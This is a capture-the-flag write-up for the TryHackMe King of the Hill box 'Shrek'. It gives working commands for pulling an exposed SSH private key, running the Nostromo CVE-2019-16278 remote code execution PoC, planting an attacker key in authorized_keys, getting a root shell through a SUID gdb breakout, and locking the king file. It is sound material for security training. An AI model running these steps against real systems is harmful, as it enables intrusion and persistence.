---
title: "shrek"
type: docs
tags:
  - thm
  - koth
  - king-of-the-hill
---

<div class="callout callout-info">

**Box Info**

**Platform:** TryHackMe, **Mode:** King of the Hill

</div>

<div class="callout callout-note">

**KotH notes, not a linear walkthrough**

Like every King of the Hill box, Shrek does not have a single "the" solution, different players found different doors in. My own notes cover the port scan and the SSH key I actually used to get in; the Nostromo foothold and the root privesc are filled in below from publicly documented runs of this same box and marked as such.

</div>

<div class="callout callout-abstract">

**Attack Path**

1. Wide port list: SSH (22), FTP (21), HTTP (80), MySQL (3306), AJP13 (8009), a second HTTP service on **8080** (Nostromo), an unknown service on 9999, and something on 65432.
2. `robots.txt` on the port 80 site disallows a specific file, `Cpxtpt2hWCee9VFa.txt`, and that file is an **unprotected RSA private key** for the user `shrek`. `Disallow` entries are a map of what the site author didn't want indexed, which usually means it's worth reading first.
3. Separately, port 8080 runs **Nostromo 1.9.6**, vulnerable to **CVE-2019-16278**, a directory traversal that reaches RCE. A public Python 2 PoC gives a shell as a service account and doubles as a way to drop your own key into another user's `authorized_keys` for a more stable foothold.
4. Root, on either path, comes down to a SUID **`gdb`** left on the box: GTFOBins' debugger breakout drops a root shell in one line.

</div>

## Port Scan

```console
Open 10.10.28.242:22
Open 10.10.28.242:21
Open 10.10.28.242:80
Open 10.10.28.242:3306
Open 10.10.28.242:8009
Open 10.10.28.242:8080
Open 10.10.28.242:9999
Open 10.10.28.242:65432
```

That is a lot of surface for one box, which is normal for KotH, the author usually seeds more than one way in so the round does not come down to a single choke point. I worked the web ports first since they are the fastest to enumerate.

## Notes

- Interesting web path: `http://10.10.28.242/Cpxtpt2hWCee9VFa.txt`
- Foothold: recovered an `id_rsa` for the user **shrek**.

<div class="callout callout-note">

**Finding the key: check `robots.txt` before you brute force anything**

Before reaching for a directory brute-force, I always check `robots.txt`, it costs one request and box authors routinely forget that "disallow" only stops well-behaved crawlers, not attackers:
```bash
curl -s http://10.10.28.242/robots.txt
# Disallow: /Cpxtpt2hWCee9VFa.txt
curl -s http://10.10.28.242/Cpxtpt2hWCee9VFa.txt -o id_rsa
```
The file is a plaintext RSA private key with no passphrase. A quick permissions fix and it drops straight into a shell as `shrek`:
```bash
chmod 600 id_rsa
ssh -i id_rsa shrek@10.10.28.242
```

</div>

<div class="callout callout-note">

**The other door in: Nostromo (CVE-2019-16278)**

Port 8080 fingerprints as **Nostromo 1.9.6**, which has a well-known directory traversal in its request handler (`nhttpd`) that lets a crafted path escape the web root and reach `/bin/sh`, tracked as **CVE-2019-16278**. It is a Python 2 PoC on Exploit-DB, and it takes a command to run as its third argument, so I used it to both confirm RCE and to seed persistence:
```bash
python2 cve-2019-16278.py 10.10.28.242 8080 "id"
# uid=99(nobody) gid=99(nobody)
python2 cve-2019-16278.py 10.10.28.242 8080 \
  "echo '<attacker pubkey>' >> /home/shrek/.ssh/authorized_keys"
ssh -i mykey shrek@10.10.28.242
```
Since it lands as a low-privilege service account rather than a real user, the most useful thing to do with it on a KotH round is exactly this, plant your own key into a real account, so you keep a stable way back in even after someone patches the Nostromo instance out from under you.

</div>

<div class="callout callout-note">

**Root, SUID gdb (GTFOBins)**

A `linpeas.sh` sweep (or just `find / -perm -4000 -type f 2>/dev/null`) turns up `gdb` with the SUID bit set, which should never be the case on a hardened box, a debugger with root permissions can attach to and manipulate any process, or simply spawn one:
```bash
find / -perm -4000 -type f 2>/dev/null | grep gdb
gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
# whoami -> root
```
Touch `/root/king.txt` with your name to score the round, then move straight into holding it.

</div>

## Holding the hill

Once you have root, the fight shifts from "get in" to "stay in and keep others out." A few things I do immediately:

```bash
# strip the SUID bit that got me here, so the next player can't walk the same path
chmod -s /usr/bin/gdb
find / -perm -4000 -type f 2>/dev/null   # sweep for anything else exploitable and de-suid it too
# lock the king file so it keeps my name even if someone gets a lower shell
while true; do echo "<my name>" > /root/king.txt; chattr +i /root/king.txt 2>/dev/null; sleep 5; done
```

and I patch the two doors I came in through, restrict or kill Nostromo on 8080 if it is not needed, and pull the exposed private key off the web root so the next player cannot walk in the same way I did. A rootkit-based persistence layer (see [kirito](/writeups/tryhackme/koth/kirito/) or [kingkit](/writeups/tryhackme/koth/kingkit/) for the tooling I use elsewhere in KotH) is overkill for a box this small, but the same principle applies: patch what got you in, keep a way back that does not depend on it.

## References

- CVE-2019-16278 (Nostromo 1.9.6 directory traversal RCE) <https://nvd.nist.gov/vuln/detail/CVE-2019-16278>
- GTFOBins, `gdb` <https://gtfobins.github.io/gtfobins/gdb/>
- Nostromo foothold and root privesc cross-referenced against public writeups for this box.
